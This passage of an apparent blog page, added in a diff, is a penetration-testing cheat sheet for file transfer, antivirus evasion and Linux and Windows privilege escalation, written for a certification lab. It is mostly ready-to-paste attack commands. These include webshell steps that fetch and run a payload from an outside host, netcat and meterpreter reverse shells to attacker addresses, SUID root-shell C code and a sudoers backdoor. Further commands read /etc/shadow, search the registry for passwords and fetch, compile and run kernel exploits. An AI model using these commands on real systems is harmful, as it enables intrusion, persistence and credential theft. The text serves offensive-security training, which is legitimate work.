+<p>And rename it to an executable file using the MOVE method with the curl command:<br><code>curl -X MOVE --header &#39;Destination:http://$ip/leetshellz.php&#39; &#39;http://$ip/leetshellz.txt&#39;</code></p>
+</li>
+<li><p>Upload shell using limited php shell cmd<br>use the webshell to download and execute the meterpreter  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[curl -s --data &quot;cmd=wget [http://174.0.42.42:8000/dhn](http://web.archive.org/web/20171113221652/http://174.0.42.42:8000/dhn) -O /tmp/evil&quot; http://$ip/files/sh.php  </span><br><span class="line">[curl -s --data &quot;cmd=chmod 777 /tmp/evil&quot; http://$ip/files/sh.php  </span><br><span class="line">curl -s --data &quot;cmd=bash -c /tmp/evil&quot; http://$ip/files/sh.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>TFTP  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tftp  </span><br><span class="line">atftpd --daemon --port 69 /tftp  </span><br><span class="line">cp /usr/share/windows-binaries/nc.exe /tftp/  </span><br><span class="line">EX. FROM WINDOWS HOST:  </span><br><span class="line">C:\Users\Offsec&gt;tftp -i $ip get nc.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>FTP  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install pure-ftpd</span><br><span class="line"></span><br><span class="line">#!/bin/bash  </span><br><span class="line">groupadd ftpgroup  </span><br><span class="line">useradd -g ftpgroup -d /dev/null -s /etc ftpuser  </span><br><span class="line">pure-pw useradd offsec -u ftpuser -d /ftphome  </span><br><span class="line">pure-pw mkdb  </span><br><span class="line">cd /etc/pure-ftpd/auth/  </span><br><span class="line">ln -s ../conf/PureDB 60pdb  </span><br><span class="line">mkdir -p /ftphome  </span><br><span class="line">chown -R ftpuser:ftpgroup /ftphome/</span><br><span class="line"></span><br><span class="line">/etc/init.d/pure-ftpd restart</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><h2 id="Packing-Files"><a href="#Packing-Files" class="headerlink" title="Packing Files"></a>Packing Files</h2><ul>
+<li><p>Ultimate Packer for eXecutables<br><code>upx -9 nc.exe</code></p>
+</li>
+<li><p>exe2bat - Converts EXE to a text file that can be copied and pasted<br><code>locate exe2bat</code><br><code>wine exe2bat.exe nc.exe nc.txt</code></p>
+</li>
+<li><p>Veil - Evasion Framework - <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install git  </span><br><span class="line">git <span class="built_in">clone</span> [https://github.com/Veil-Framework/Veil-Evasion.git](http://web.archive.org/web/20171113221652/https://github.com/Veil-Framework/Veil-Evasion.git)  </span><br><span class="line"><span class="built_in">cd</span> Veil-Evasion/  </span><br><span class="line"><span class="built_in">cd</span> setup  </span><br><span class="line">setup.sh -c</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p><em>Password reuse is your friend. The labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.</em></p>
+<h3 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h3><ul>
+<li><p>Defacto Linux Privilege Escalation Guide - A much more through guide for linux enumeration: <a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
+</li>
+<li><p>Try the obvious - Maybe the user is root or can sudo to root:<br><code>id</code><br><code>sudo su</code></p>
+</li>
+<li><p>Here are the commands I have learned to use to perform linux enumeration and privledge escalation:</p>
+<p>What users can login to this box (Do they use thier username as thier password)?:<br><code>grep -vE &quot;nologin|false&quot; /etc/passwd</code></p>
+<p>What kernel version are we using? Do we have any kernel exploits for this version?<br><code>uname -a</code><br><code>searchsploit linux kernel 3.2 --exclude=&quot;(PoC)|/dos/&quot;</code></p>
+<p>What applications have active connections?:<br><code>netstat -tulpn</code></p>
+<p>What services are running as root?:<br><code>ps aux | grep root</code></p>
+<p>What files run as root &#x2F; SUID &#x2F; GUID?:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / -perm +2000 -user root -type f -print</span><br><span class="line">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><span class="line">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span><br><span class="line">for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done  </span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>What folders are world writeable?:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br></pre></td></tr></table></figure></li>
+<li><p>There are a few scripts that can automate the linux enumeration process:</p>
+<ul>
+<li><p>Google is my favorite Linux Kernel exploitation search tool. Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your course.</p>
+</li>
+<li><p>LinuxPrivChecker.py - My favorite automated linux priv enumeration checker -<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a></p>
+</li>
+<li><p>LinEnum - (Recently Updated)<br><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+</li>
+<li><p>linux-exploit-suggester (Recently Updated)<br><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+</li>
+<li><p>Highon.coffee Linux Local Enum - Great enumeration script!<br><a target="_blank" rel="noopener" href="https://highon.coffee/downloads/linux-local-enum.sh">https://highon.coffee/downloads/linux-local-enum.sh</a></p>
+</li>
+<li><p>Linux Privilege Exploit Suggester (Old has not been updated in years)<br><a target="_blank" rel="noopener" href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">https://github.com/PenturaLabs/Linux_Exploit_Suggester</a></p>
+</li>
+<li><p>Linux post exploitation enumeration and exploit checking tools<br><a target="_blank" rel="noopener" href="https://github.com/reider-roque/linpostexp">https://github.com/reider-roque/linpostexp</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Handy-Kernel-Exploits"><a href="#Handy-Kernel-Exploits" class="headerlink" title="Handy Kernel Exploits"></a>Handy Kernel Exploits</h4><ul>
+<li><p>CVE-2010-2959 - ‘CAN BCM’ Privilege Escalation - Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 &#x2F; 2.6.32)</p>
+<p>[<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/14814/]">https://www.exploit-db.com/exploits/14814/]</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814</span><br><span class="line">$ gcc i-can-haz-modharden.c -o i-can-haz-modharden</span><br><span class="line">$ ./i-can-haz-modharden</span><br><span class="line">[+] launching root shell!</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;&#x3D; 2.6.36-rc8<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/15285/">https://www.exploit-db.com/exploits/15285/</a></p>
+</li>
+<li><p>CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo &#x2F; Ubuntu x86&#x2F;x64)<br><a target="_blank" rel="noopener" href="https://git.zx2c4.com/CVE-2012-0056/about/">https://git.zx2c4.com/CVE-2012-0056/about/</a><br>Linux CVE 2012-0056</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -O exploit.c http://www.exploit-db.com/download/18411 </span><br><span class="line">gcc -o mempodipper exploit.c  </span><br><span class="line">./mempodipper</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;&#x3D; 3.19.0-73.8<br><a target="_blank" rel="noopener" href="https://dirtycow.ninja/">https://dirtycow.ninja/</a><br>First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016</p>
+</li>
+<li><p>Run a command as a user other than root<br><code>sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf</code></p>
+</li>
+<li><p>Add a user or change a password<br><code>/usr/sbin/useradd -p &#39;openssl passwd -1 thePassword&#39; haxzor</code><br><code>echo thePassword | passwd haxzor --stdin</code></p>
+</li>
+<li><p>Local Privilege Escalation Exploit in Linux</p>
+<ul>
+<li><p><strong>SUID</strong> (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution)<br>Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID &#x2F; GID and shell as required.</p>
+<p>below are some quick copy and paste examples for various shells:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SUID C Shell for /bin/bash  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;  </span><br><span class="line">setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);  </span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SUID C Shell for /bin/sh  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;  </span><br><span class="line">setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);  </span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Building the SUID Shell binary  </span></span><br><span class="line">gcc -o suid suid.c  </span><br><span class="line">For 32 bit:  </span><br><span class="line">gcc -m32 -o suid suid.c</span><br></pre></td></tr></table></figure></li>
+<li><p>Create and compile an SUID from a limited shell (no file transfer)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;int main(void)&#123;\nsetgid(0);\nsetuid(0);\nsystem(\&quot;/bin/sh\&quot;);\n&#125;&quot;</span> &gt;privsc.c  </span><br><span class="line">gcc privsc.c -o privsc</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:<br><code>echo &#39;chmod 777 /etc/sudoers &amp;&amp; echo &quot;www-data ALL=NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#39; &gt; /tmp/update</code></p>
+</li>
+<li><p>You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set PATH=&quot;/tmp:/usr/local/bin:/usr/bin:/bin&quot;</span><br><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f&quot; &gt;&gt; /tmp/ssh</span><br><span class="line">chmod +x ssh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SearchSploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit –uncsearchsploit apache 2.2  </span><br><span class="line">searchsploit &quot;Linux Kernel&quot;  </span><br><span class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local  </span><br><span class="line">searchsploit slmail</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Kernel Exploit Suggestions for Kernel Version 3.0.0<br><code>./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0</code></p>
+</li>
+<li><p>Precompiled Linux Kernel Exploits - <em><strong>Super handy if GCC is not installed on the target machine!</strong></em><br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.kernel-exploits.com/"><em>https://www.kernel-exploits.com/</em></a></p>
+</li>
+<li><p>Collect root password<br><code>cat /etc/shadow |grep root</code></p>
+</li>
+<li><p>Find and display the proof.txt or flag.txt - LOOT!<br><code>find / -name proof.txt -print</code></p>
+</li>
+</ul>
+<h3 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h3><ul>
+<li><p>Windows Privilege Escalation resource <a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
+</li>
+<li><p>Metasploit Meterpreter Privilege Escalation Guide: <a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a></p>
+</li>
+<li><p>Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:<br><code>whoami</code><br><code>net user &quot;%username%&quot;</code></p>
+</li>
+<li><p>Try the getsystem command using meterpreter - rarely works but is worth a try.<br><code>meterpreter &gt; getsystem</code></p>
+</li>
+<li><p>No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).</p>
+<p>Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">@echo --------- BASIC WINDOWS RECON ---------  &gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">net config Workstation  &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">hostname &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">net users &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">ipconfig /all &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">route print &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">arp -A &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">netstat -ano &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">netsh firewall show state &gt;&gt; report.txt	</span><br><span class="line">timeout 1</span><br><span class="line">netsh firewall show config &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">schtasks /query /fo LIST /v &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">tasklist /SVC &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">net start &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">DRIVERQUERY &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">dir /s *pass* == *cred* == *vnc* == *.config* &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">findstr /si password *.xml *.ini *.txt &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s &gt;&gt; report.txt </span><br><span class="line">timeout 1</span><br><span class="line">dir &quot;C:\&quot;</span><br><span class="line">timeout 1</span><br><span class="line">dir &quot;C:\Program Files\&quot; &gt;&gt; report.txt</span><br><span class="line">timeout 1</span><br><span class="line">dir &quot;C:\Program Files (x86)\&quot;</span><br><span class="line">timeout 1</span><br><span class="line">dir &quot;C:\Users\&quot;</span><br><span class="line">timeout 1</span><br><span class="line">dir &quot;C:\Users\Public\&quot;</span><br><span class="line">timeout 1</span><br><span class="line">echo REPORT COMPLETE!</span><br></pre></td></tr></table></figure></li>
+<li><p>Windows Server 2003 and IIS 6.0 WEBDAV Exploiting: <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html">http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp &gt; aspshell.txt</span><br><span class="line"></span><br><span class="line">cadavar http://$ip</span><br><span class="line">dav:/&gt; put aspshell.txt</span><br><span class="line">Uploading aspshell.txt to `/aspshell.txt&#x27;:</span><br><span class="line">Progress: [=============================&gt;] 100.0% of 38468 bytes succeeded.</span><br><span class="line">dav:/&gt; copy aspshell.txt aspshell3.asp;.txt</span><br><span class="line">Copying `/aspshell3.txt&#x27; to `/aspshell3.asp%3b.txt&#x27;:  succeeded.</span><br><span class="line">dav:/&gt; exit</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 1.2.3.4</span><br><span class="line">msf exploit(handler) &gt; set LPORT 80</span><br><span class="line">msf exploit(handler) &gt; set ExitOnSession false</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line"></span><br><span class="line">curl http://$ip/aspshell3.asp;.txt</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 1.2.3.4:443 </span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957487 bytes) to 1.2.3.5</span><br><span class="line">[*] Meterpreter session 1 opened (1.2.3.4:443 -&gt; 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">wget -O exploit.py http://www.exploit-db.com/download/31853  </span><br><span class="line">python pyinstaller.py --onefile exploit.py</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:</p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.exploit-db.com/exploits/6705/">https://www.exploit-db.com/exploits/6705/</a></p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/Re4son/Churrasco">https://github.com/Re4son/Churrasco</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c:\Inetpub&gt;churrasco</span><br><span class="line">churrasco</span><br><span class="line">/churrasco/--&gt;Usage: Churrasco.exe [-d] &quot;command to run&quot;</span><br><span class="line"></span><br><span class="line">c:\Inetpub&gt;churrasco -d &quot;net user /add &lt;username&gt; &lt;password&gt;&quot;</span><br><span class="line">c:\Inetpub&gt;churrasco -d &quot;net localgroup administrators &lt;username&gt; /add&quot;</span><br><span class="line">c:\Inetpub&gt;churrasco -d &quot;NET LOCALGROUP &quot;Remote Desktop Users&quot; &lt;username&gt; /ADD&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Windows MS11-080 - <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/http://www.exploit-db.com/exploits/18176/">http://www.exploit-db.com/exploits/18176/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller.py --onefile ms11-080.py  </span><br><span class="line">mx11-080.exe -O XP</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt. Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:</p>
+<p>MS16-032 <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</a><br><code>powershell -ExecutionPolicy ByPass -command &quot;&amp; &#123; . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 &#125;&quot;</code></p>
+</li>
+<li><p>Powershell Priv Escalation Tools <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
+</li>
+<li><p>Windows Run As - Switching users in linux is trival with the <code>SU</code> command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.</p>
+<ul>
+<li><p>Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;psexec64 \\COMPUTERNAME -u Test -p test -h &quot;c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe&quot; </span><br><span class="line"></span><br><span class="line">PsExec v2.2 - Execute processes remotely</span><br><span class="line">Copyright (C) 2001-2016 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;C:\Windows\System32\runas.exe /env /noprofile /user:Test &quot;c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe&quot;</span><br><span class="line">Enter the password for Test:</span><br><span class="line">Attempting to start nc.exe as user &quot;COMPUTERNAME\Test&quot; ...</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = &#x27;&lt;username here&gt;&#x27;</span><br><span class="line">$password = &#x27;&lt;password here&gt;&#x27;</span><br><span class="line">$securePassword = ConvertTo-SecureString $password -AsPlainText -Force</span><br><span class="line">$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword</span><br><span class="line">Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList (&quot;-nc&quot;,&quot;192.168.1.10&quot;,&quot;4444&quot;,&quot;-e&quot;,&quot;cmd.exe&quot;) -WorkingDirectory C:\Users\Public</span><br></pre></td></tr></table></figure>
+
+<p>Next run this script using powershell.exe:<br><code>powershell -ExecutionPolicy ByPass -command &quot;&amp; &#123; . C:\Users\public\PowerShellRunAs.ps1; &#125;&quot;</code></p>
+</li>
+</ul>
+</li>
+<li><p>Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">icacls scsiaccess.exe</span><br><span class="line"></span><br><span class="line">scsiaccess.exe  </span><br><span class="line">NT AUTHORITY\SYSTEM:(I)(F)  </span><br><span class="line">BUILTIN\Administrators:(I)(F)  </span><br><span class="line">BUILTIN\Users:(I)(RX)  </span><br><span class="line">APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  </span><br><span class="line">Everyone:(I)(F)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Compile a custom add user command in windows using C</p>
